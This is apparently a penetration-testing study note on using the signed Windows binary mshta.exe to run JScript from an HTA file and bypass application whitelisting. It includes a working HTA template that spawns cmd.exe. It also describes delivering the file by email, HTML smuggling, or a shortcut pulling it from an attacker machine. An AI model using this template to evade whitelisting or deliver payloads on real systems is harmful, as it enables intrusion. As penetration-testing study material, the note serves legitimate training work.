## _MSHTA_ client side attack vector
Since mshta.exe is located in 
```cmd
C:\Windows\System32\mshta.exe
```
and is a signed Microsoft application, it is commonly whitelisted.
Because of this, we can execute our Jscript code with mshta.exe instead of wscript.exe, and subsequently, bypass application whitelisting.

A very simple HTA file containing Jscript code is as follows:
```html
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

When executed by mshta.exe, the Jscript code inside both the head and the body tags will be executed, a command prompt will be spawned and the mshta.exe window will be closed.
We can deliver this in a few different ways. For example, we could attach it to an email, or HTML-smuggle the file through a browser.

We can create a shortcut to grab the file from our kali attack box, running the shortcut file, will execute our code.
